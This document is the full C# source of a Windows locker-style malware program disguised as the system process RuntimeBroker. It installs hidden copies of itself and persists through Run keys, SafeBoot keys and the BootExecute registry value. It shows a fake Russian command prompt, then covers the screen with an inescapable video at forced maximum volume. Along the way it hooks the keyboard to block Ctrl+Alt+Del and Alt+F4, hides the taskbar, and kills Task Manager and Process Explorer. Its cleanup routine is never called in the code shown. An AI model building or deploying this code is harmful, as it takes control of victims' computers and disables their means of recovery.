using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace RuntimeBroker
{
    static class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeConsole();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);
        [DllImport("user32.dll")]
        static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
        [DllImport("user32.dll")]
        static extern bool DrawMenuBar(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern bool DeleteMenu(IntPtr hMenu, uint uPosition, uint uFlags);

        const uint SC_CLOSE = 0xF060;
        const uint MF_BYCOMMAND = 0x00000000;
        const uint MF_GRAYED = 0x00000001;
        const uint MF_DISABLED = 0x00000002;

        const string RUN_VALUE_NAME = "WindowsUpdateCheck";
        const string MARKER_NAME = ".ovl_marker";
        const string BOOT_EXE_NAME = "smsshost.exe";
        const string COPY_NAME = "RuntimeBroker.exe";

        static void TypeText(string text, int delayMs = 120)
        {
            foreach (char c in text) { Console.Write(c); Thread.Sleep(delayMs); }
        }

        static void TypeLine(string text, int delayMs = 120)
        {
            TypeText(text, delayMs); Console.WriteLine();
        }

        static void FakePromptWithBlink(string prompt, int blinkSeconds = 3)
        {
            Console.Write(prompt);
            int cycles = blinkSeconds * 2;
            for (int i = 0; i < cycles; i++)
            {
                Console.Write("_"); Thread.Sleep(400);
                Console.Write("\b \b"); Thread.Sleep(400);
            }
        }

        static void DisableConsoleClose()
        {
            try
            {
                IntPtr hwnd = GetConsoleWindow();
                if (hwnd == IntPtr.Zero) return;
                IntPtr hMenu = GetSystemMenu(hwnd, false);
                if (hMenu != IntPtr.Zero)
                {
                    EnableMenuItem(hMenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED | MF_DISABLED);
                    DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
                    DrawMenuBar(hwnd);
                }
            }
            catch { }
        }

        static string GetExePath()
        {
            try
            {
                string p = Assembly.GetExecutingAssembly().Location;
                if (!string.IsNullOrEmpty(p)) return p;
            }
            catch { }
            try { return Process.GetCurrentProcess().MainModule.FileName; } catch { }
            return null;
        }

        static string[] GetCopyDirs()
        {
            var list = new List<string>();
            try { list.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows")); } catch { }
            try { list.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp")); } catch { }
            try { list.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Documents")); } catch { }
            try { list.Add(Path.GetTempPath()); } catch { }
            return list.ToArray();
        }

        static string GetBootExePath()
        {
            try
            {
                string sys = Environment.GetFolderPath(Environment.SpecialFolder.System);
                return Path.Combine(sys, BOOT_EXE_NAME);
            }
            catch { }
            return Path.Combine(@"C:\Windows\System32", BOOT_EXE_NAME);
        }

        public static void InstallBootExecute()
        {
            string src = GetExePath();
            if (string.IsNullOrEmpty(src) || !File.Exists(src)) return;

            string bootPath = GetBootExePath();
            try
            {
                if (!File.Exists(bootPath))
                {
                    File.Copy(src, bootPath, true);
                    try { File.SetAttributes(bootPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
            }
            catch { return; }

            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Control\Session Manager", true))
                {
                    if (k == null) return;

                    object raw = k.GetValue("BootExecute");
                    var entries = new List<string>();

                    if (raw is string[])
                        entries.AddRange((string[])raw);
                    else if (raw is string)
                        entries.Add((string)raw);

                    bool hasAutocheck = false;
                    foreach (string e in entries)
                        if (e != null && e.IndexOf("autocheck", StringComparison.OrdinalIgnoreCase) >= 0)
                        { hasAutocheck = true; break; }

                    if (!hasAutocheck)
                        entries.Insert(0, "autocheck autochk *");

                    bool already = false;
                    foreach (string e in entries)
                        if (string.Equals(e, BOOT_EXE_NAME, StringComparison.OrdinalIgnoreCase))
                        { already = true; break; }

                    if (!already)
                        entries.Add(BOOT_EXE_NAME);

                    k.SetValue("BootExecute", entries.ToArray(), RegistryValueKind.MultiString);
                }
            }
            catch { }
        }

        public static void RemoveBootExecute()
        {
            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Control\Session Manager", true))
                {
                    if (k == null) return;

                    object raw = k.GetValue("BootExecute");
                    var entries = new List<string>();

                    if (raw is string[])
                        entries.AddRange((string[])raw);
                    else if (raw is string)
                        entries.Add((string)raw);

                    entries.RemoveAll(e =>
                        e != null &&
                        (e.Equals(BOOT_EXE_NAME, StringComparison.OrdinalIgnoreCase) ||
                         e.IndexOf(BOOT_EXE_NAME, StringComparison.OrdinalIgnoreCase) >= 0));

                    if (entries.Count == 0)
                        entries.Add("autocheck autochk *");

                    k.SetValue("BootExecute", entries.ToArray(), RegistryValueKind.MultiString);
                }
            }
            catch { }

            try
            {
                string bootPath = GetBootExePath();
                if (File.Exists(bootPath))
                {
                    try { File.SetAttributes(bootPath, FileAttributes.Normal); } catch { }
                    File.Delete(bootPath);
                }
            }
            catch { }
        }

        public static List<string> InstallCopiesAndPersistence()
        {
            var created = new List<string>();
            string src = GetExePath();
            if (string.IsNullOrEmpty(src) || !File.Exists(src)) return created;

            string listFile = Path.Combine(Path.GetTempPath(), "ovl_copies.txt");
            var paths = new List<string>();

            foreach (string dir in GetCopyDirs())
            {
                try
                {
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    string dest = Path.Combine(dir, COPY_NAME);
                    if (!File.Exists(dest))
                    {
                        File.Copy(src, dest, true);
                        File.WriteAllText(Path.Combine(dir, MARKER_NAME), "1");
                        created.Add(dest);
                    }
                    paths.Add(dest);
                }
                catch { }
            }

            try { File.WriteAllLines(listFile, paths); } catch { }

            string runTarget = paths.Count > 0 ? paths[0] : src;
            string cmd = "\"" + runTarget + "\" --video";

            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (k != null) k.SetValue(RUN_VALUE_NAME, cmd);
                }
            }
            catch { }

            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (k != null) k.SetValue(RUN_VALUE_NAME, cmd);
                }
            }
            catch { }

            string name = Path.GetFileNameWithoutExtension(runTarget);
            string[] safeKeys = {
                @"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
                @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network"
            };
            foreach (string path in safeKeys)
            {
                try
                {
                    using (RegistryKey root = Registry.LocalMachine.OpenSubKey(path, true))
                    {
                        if (root == null) continue;
                        using (RegistryKey sub = root.CreateSubKey(name))
                        {
                            if (sub != null) sub.SetValue("", "Service");
                        }
                    }
                }
                catch { }
            }

            InstallBootExecute();
            return created;
        }

        public static void RemoveAllPersistenceAndCopies()
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (k != null) k.DeleteValue(RUN_VALUE_NAME, false);
                }
            }
            catch { }

            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (k != null) k.DeleteValue(RUN_VALUE_NAME, false);
                }
            }
            catch { }

            string listFile = Path.Combine(Path.GetTempPath(), "ovl_copies.txt");
            var toDelete = new List<string>();
            try
            {
                if (File.Exists(listFile))
                    toDelete.AddRange(File.ReadAllLines(listFile));
            }
            catch { }

            foreach (string dir in GetCopyDirs())
            {
                try
                {
                    string dest = Path.Combine(dir, COPY_NAME);
                    if (File.Exists(Path.Combine(dir, MARKER_NAME)))
                        toDelete.Add(dest);
                }
                catch { }
            }

            foreach (string f in toDelete)
            {
                try { if (File.Exists(f)) File.Delete(f); } catch { }
                try
                {
                    string marker = Path.Combine(Path.GetDirectoryName(f) ?? "", MARKER_NAME);
                    if (File.Exists(marker)) File.Delete(marker);
                }
                catch { }
            }
            try { if (File.Exists(listFile)) File.Delete(listFile); } catch { }

            try
            {
                string name = "RuntimeBroker";
                string[] safeKeys = {
                    @"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\" + name,
                    @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\" + name
                };
                foreach (string path in safeKeys)
                {
                    try { Registry.LocalMachine.DeleteSubKeyTree(path, false); } catch { }
                }
            }
            catch { }

            RemoveBootExecute();
        }

        public static void EnsureCopiesAlive()
        {
            string src = null;
            foreach (string dir in GetCopyDirs())
            {
                string p = Path.Combine(dir, COPY_NAME);
                if (File.Exists(p)) { src = p; break; }
            }
            if (src == null) src = GetExePath();
            if (string.IsNullOrEmpty(src) || !File.Exists(src)) return;

            foreach (string dir in GetCopyDirs())
            {
                try
                {
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    string dest = Path.Combine(dir, COPY_NAME);
                    if (!File.Exists(dest))
                    {
                        File.Copy(src, dest, true);
                        File.WriteAllText(Path.Combine(dir, MARKER_NAME), "1");
                    }
                }
                catch { }
            }

            try
            {
                string bootPath = GetBootExePath();
                if (!File.Exists(bootPath) && File.Exists(src))
                {
                    File.Copy(src, bootPath, true);
                    try { File.SetAttributes(bootPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
            }
            catch { }
        }

        [STAThread]
        static void Main(string[] args)
        {
            bool videoOnly = false;
            foreach (string a in args)
                if (a == "--video" || a == "/video") { videoOnly = true; break; }

            if (!videoOnly)
            {
                InstallCopiesAndPersistence();

                try
                {
                    string exePath = GetExePath();
                    string delayCmd = "/c timeout /t 12 /nobreak >nul & start \"\" \"" + exePath + "\" --video";
                    var psi = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = delayCmd,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(psi);
                }
                catch { }

                try { AllocConsole(); } catch { }
                Console.Title = "Администратор: Командная строка";
                try { Console.CursorVisible = false; } catch { }
                try { Console.Clear(); } catch { }
                DisableConsoleClose();

                Console.WriteLine("Microsoft Windows [Version 10.0.26200.9711]");
                Console.WriteLine("(c) Корпорация Майкрософт (Microsoft Corporation). Все права защищены.");
                Console.WriteLine();

                string prompt = @"C:\Users\User>";
                FakePromptWithBlink(prompt, 2);
                TypeLine("burmalda", 150); Thread.Sleep(250);
                TypeLine("хехехехехехе бурмалдишь", 80); Thread.Sleep(350);
                FakePromptWithBlink(prompt, 1);
                TypeLine("hammam", 150); Thread.Sleep(300);
                TypeLine("ыыыыы хаммам", 90);
                Thread.Sleep(1500);

                try { FreeConsole(); } catch { }
                return;
            }

            InstallCopiesAndPersistence();
            EnsureCopiesAlive();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new OverlayForm());
        }
    }

    public class OverlayForm : Form
    {
        [DllImport("winmm.dll")] static extern int waveOutGetVolume(IntPtr hwo, out uint dwVolume);
        [DllImport("winmm.dll")] static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll")] static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")] static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll")] static extern bool BringWindowToTop(IntPtr hWnd);
        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")] static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")] static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int GetClassName(IntPtr hWnd, System.Text.StringBuilder lpClassName, int nMaxCount);
        [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);

        delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x0100;
        const int WM_SYSKEYDOWN = 0x0104;
        const int WM_KEYUP = 0x0101;
        const int WM_SYSKEYUP = 0x0105;

        const int VK_LWIN = 0x5B;
        const int VK_RWIN = 0x5C;
        const int VK_ESCAPE = 0x1B;
        const int VK_F4 = 0x73;
        const int VK_MENU = 0x12;
        const int VK_LMENU = 0xA4;
        const int VK_RMENU = 0xA5;
        const int VK_CONTROL = 0x11;
        const int VK_LCONTROL = 0xA2;
        const int VK_RCONTROL = 0xA3;
        const int VK_DELETE = 0x2E;
        const int VK_TAB = 0x09;

        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        static readonly IntPtr HWND_BOTTOM = new IntPtr(1);
        const uint SWP_NOMOVE = 0x0002, SWP_NOSIZE = 0x0001, SWP_SHOWWINDOW = 0x0040;
        const uint SWP_HIDEWINDOW = 0x0080, SWP_NOACTIVATE = 0x0010;
        const int GWL_EXSTYLE = -20, WS_EX_TOPMOST = 0x00000008, WS_EX_TOOLWINDOW = 0x00000080;
        const int SW_HIDE = 0, SW_SHOW = 5;
        const uint MAX_VOL = 0xFFFFFFFF;

        string tempDir, audioPath;
        List<Image> frames = new List<Image>();
        int frameIndex;
        System.Windows.Forms.Timer playTimer, topmostTimer, volumeTimer, taskMgrTimer, copyWatchTimer;
        bool closing;
        SoundPlayer player;
        List<IntPtr> hiddenShellWindows = new List<IntPtr>();
        DateTime videoStartUtc;
        const double Fps = 30.0;
        static IntPtr hookId = IntPtr.Zero;
        static LowLevelKeyboardProc hookProc;
        uint savedVolume;

        static bool ctrlDown, altDown;

        public OverlayForm()
        {
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            TopMost = true;
            ShowInTaskbar = false;
            BackColor = Color.Black;
            KeyPreview = true;
            DoubleBuffered = true;
            SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.OptimizedDoubleBuffer, true);
            Cursor.Hide();
            Bounds = Screen.PrimaryScreen.Bounds;
            KeyDown += OnKeyDown;
            Load += OnLoad;
            FormClosing += OnFormClosing;
            Paint += OnPaint;
            Shown += OnShown;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= WS_EX_TOPMOST | WS_EX_TOOLWINDOW;
                return cp;
            }
        }

        void OnShown(object sender, EventArgs e)
        {
            InstallKeyboardHook();
            HideShell();
            ForceTopMost();
            ForceMaxVolume();
            KillTaskManagers();

            topmostTimer = new System.Windows.Forms.Timer { Interval = 80 };
            topmostTimer.Tick += (s, ev) => { HideShell(); ForceTopMost(); };
            topmostTimer.Start();

            volumeTimer = new System.Windows.Forms.Timer { Interval = 200 };
            volumeTimer.Tick += (s, ev) => ForceMaxVolume();
            volumeTimer.Start();

            taskMgrTimer = new System.Windows.Forms.Timer { Interval = 250 };
            taskMgrTimer.Tick += (s, ev) => KillTaskManagers();
            taskMgrTimer.Start();

            copyWatchTimer = new System.Windows.Forms.Timer { Interval = 2000 };
            copyWatchTimer.Tick += (s, ev) => Program.EnsureCopiesAlive();
            copyWatchTimer.Start();
        }

        void KillTaskManagers()
        {
            string[] names = {
                "Taskmgr", "taskmgr", "ProcessHacker", "procexp", "procexp64",
                "perfmon", "resmon", "ProcessExplorer", "SystemExplorer",
                "procmon", "procmon64", "TaskManager", "ProcessHacker2"
            };
            try
            {
                foreach (string name in names)
                    foreach (Process p in Process.GetProcessesByName(name))
                    {
                        try { p.Kill(); } catch { }
                    }
            }
            catch { }
        }

        void ForceMaxVolume()
        {
            try { waveOutSetVolume(IntPtr.Zero, MAX_VOL); } catch { }
        }

        void InstallKeyboardHook()
        {
            try
            {
                hookProc = HookCallback;
                using (Process cur = Process.GetCurrentProcess())
                using (ProcessModule mod = cur.MainModule)
                    hookId = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, GetModuleHandle(mod.ModuleName), 0);
            }
            catch { }
        }

        static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int msg = wParam.ToInt32();
                int vk = Marshal.ReadInt32(lParam);

                bool isDown = (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN);
                bool isUp = (msg == WM_KEYUP || msg == WM_SYSKEYUP);

                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL)
                {
                    if (isDown) ctrlDown = true;
                    if (isUp) ctrlDown = false;
                }
                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU)
                {
                    if (isDown) altDown = true;
                    if (isUp) altDown = false;
                }

                bool ctrl = ctrlDown || (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0 ||
                            (GetAsyncKeyState(VK_LCONTROL) & 0x8000) != 0 ||
                            (GetAsyncKeyState(VK_RCONTROL) & 0x8000) != 0;
                bool alt = altDown || (GetAsyncKeyState(VK_MENU) & 0x8000) != 0 ||
                           (GetAsyncKeyState(VK_LMENU) & 0x8000) != 0 ||
                           (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0;

                if (isDown)
                {
                    // Win keys
                    if (vk == VK_LWIN || vk == VK_RWIN)
                        return (IntPtr)1;

                    // Escape — blocked (no exit)
                    if (vk == VK_ESCAPE)
                        return (IntPtr)1;

                    // Alt+F4
                    if (vk == VK_F4 && alt)
                        return (IntPtr)1;

                    // Ctrl+Alt+Del
                    if (vk == VK_DELETE && ctrl && alt)
                        return (IntPtr)1;

                    // Ctrl+Alt+Esc
                    if (vk == VK_ESCAPE && ctrl && alt)
                        return (IntPtr)1;

                    // Alt+Tab
                    if (vk == VK_TAB && alt)
                        return (IntPtr)1;

                    // Alt+Esc
                    if (vk == VK_ESCAPE && alt)
                        return (IntPtr)1;
                }
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        void UninstallKeyboardHook()
        {
            try
            {
                if (hookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(hookId);
                    hookId = IntPtr.Zero;
                }
            }
            catch { }
        }

        void HideShell()
        {
            try
            {
                HideWindow(FindWindow("Shell_TrayWnd", null));
                HideWindow(FindWindow("Shell_SecondaryTrayWnd", null));
                HideWindow(FindWindow("Button", "Start"));
                HideWindow(FindWindow("Windows.UI.Core.CoreWindow", null));
                HideWindow(FindWindow("SearchPane", null));
                HideWindow(FindWindow("ImmersiveLauncher", null));

                EnumWindows((hWnd, lParam) =>
                {
                    if (!IsWindowVisible(hWnd)) return true;
                    var sb = new System.Text.StringBuilder(256);
                    GetClassName(hWnd, sb, sb.Capacity);
                    string cls = sb.ToString();
                    if (cls == "Windows.UI.Core.CoreWindow" || cls == "ImmersiveLauncher" || cls == "SearchPane" ||
                        cls == "Shell_TrayWnd" || cls == "Shell_SecondaryTrayWnd" || cls == "DV2ControlHost" ||
                        cls == "XamlExplorerHostIslandWindow" || cls == "Windows.UI.Composition.DesktopWindowContentBridge" ||
                        cls.IndexOf("Start", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        cls.IndexOf("Search", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        cls.IndexOf("Cortana", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        cls.IndexOf("Taskbar", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        cls.IndexOf("ShellExperience", StringComparison.OrdinalIgnoreCase) >= 0)
                        HideWindow(hWnd);
                    return true;
                }, IntPtr.Zero);
            }
            catch { }
        }

        void HideWindow(IntPtr hWnd)
        {
            if (hWnd == IntPtr.Zero) return;
            if (!hiddenShellWindows.Contains(hWnd)) hiddenShellWindows.Add(hWnd);
            ShowWindow(hWnd, SW_HIDE);
            SetWindowPos(hWnd, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_HIDEWINDOW | SWP_NOACTIVATE);
        }

        void RestoreShell()
        {
            try
            {
                foreach (IntPtr h in hiddenShellWindows)
                {
                    try { ShowWindow(h, SW_SHOW); } catch { }
                }
                IntPtr taskbar = FindWindow("Shell_TrayWnd", null);
                if (taskbar != IntPtr.Zero) ShowWindow(taskbar, SW_SHOW);
            }
            catch { }
            hiddenShellWindows.Clear();
        }

        void ForceTopMost()
        {
            try
            {
                TopMost = true;
                SetWindowPos(Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
                int ex = GetWindowLong(Handle, GWL_EXSTYLE);
                SetWindowLong(Handle, GWL_EXSTYLE, ex | WS_EX_TOPMOST | WS_EX_TOOLWINDOW);
                BringWindowToTop(Handle);
                SetForegroundWindow(Handle);
            }
            catch { }
        }

        void OnLoad(object sender, EventArgs e)
        {
            HideShell();
            ForceTopMost();
            ForceMaxVolume();
            KillTaskManagers();

            try
            {
                try { waveOutGetVolume(IntPtr.Zero, out savedVolume); } catch { savedVolume = MAX_VOL; }

                tempDir = Path.Combine(Path.GetTempPath(), "ovl_" + Guid.NewGuid().ToString("N").Substring(0, 8));
                Directory.CreateDirectory(tempDir);

                ExtractAndLoadMedia();
                if (frames.Count == 0) throw new Exception("No frames loaded.");

                if (!string.IsNullOrEmpty(audioPath) && File.Exists(audioPath))
                {
                    player = new SoundPlayer(audioPath);
                    player.Load();
                }

                ForceMaxVolume();
                videoStartUtc = DateTime.UtcNow;
                if (player != null) player.PlayLooping();

                playTimer = new System.Windows.Forms.Timer { Interval = 16 };
                playTimer.Tick += PlayTick;
                playTimer.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        void ExtractAndLoadMedia()
        {
            var asm = Assembly.GetExecutingAssembly();
            string match = null;
            foreach (string n in asm.GetManifestResourceNames())
            {
                if (n.IndexOf("media", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    n.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))
                {
                    match = n;
                    break;
                }
            }
            if (match == null) throw new FileNotFoundException("Embedded media.zip not found");

            string zipPath = Path.Combine(tempDir, "media.zip");
            using (Stream src = asm.GetManifestResourceStream(match))
            using (FileStream dst = File.Create(zipPath))
                src.CopyTo(dst);

            string extractDir = Path.Combine(tempDir, "x");
            ZipFile.ExtractToDirectory(zipPath, extractDir);

            var jpgFiles = Directory.GetFiles(extractDir, "frame_*.jpg", SearchOption.AllDirectories);
            Array.Sort(jpgFiles);
            foreach (string f in jpgFiles)
            {
                using (var fs = File.OpenRead(f))
                using (var img = Image.FromStream(fs))
                    frames.Add(new Bitmap(img));
            }

            var wavs = Directory.GetFiles(extractDir, "*.wav", SearchOption.AllDirectories);
            if (wavs.Length > 0)
            {
                audioPath = Path.Combine(tempDir, "a.wav");
                File.Copy(wavs[0], audioPath, true);
            }
        }

        void PlayTick(object sender, EventArgs e)
        {
            if (frames.Count == 0) return;
            double elapsed = (DateTime.UtcNow - videoStartUtc).TotalSeconds;
            int idx = (int)(elapsed * Fps) % frames.Count;
            if (idx != frameIndex)
            {
                frameIndex = idx;
                Invalidate();
            }
        }

        void OnPaint(object sender, PaintEventArgs e)
        {
            if (frames.Count == 0 || frameIndex >= frames.Count) return;
            try
            {
                e.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                e.Graphics.DrawImage(frames[frameIndex], ClientRectangle);
            }
            catch { }
        }

        void OnKeyDown(object sender, KeyEventArgs e)
        {
            e.Handled = true;
            e.SuppressKeyPress = true;
        }

        void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        void CleanupAndExit()
        {
            if (closing) return;
            closing = true;

            try { if (playTimer != null) playTimer.Stop(); } catch { }
            try { if (topmostTimer != null) topmostTimer.Stop(); } catch { }
            try { if (volumeTimer != null) volumeTimer.Stop(); } catch { }
            try { if (taskMgrTimer != null) taskMgrTimer.Stop(); } catch { }
            try { if (copyWatchTimer != null) copyWatchTimer.Stop(); } catch { }

            UninstallKeyboardHook();
            RestoreShell();
            Program.RemoveAllPersistenceAndCopies();

            try { waveOutSetVolume(IntPtr.Zero, savedVolume); } catch { }
            try { if (player != null) { player.Stop(); player.Dispose(); } } catch { }
            foreach (var img in frames) { try { img.Dispose(); } catch { } }
            frames.Clear();
            try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch { }

            Application.Exit();
        }
    }
}
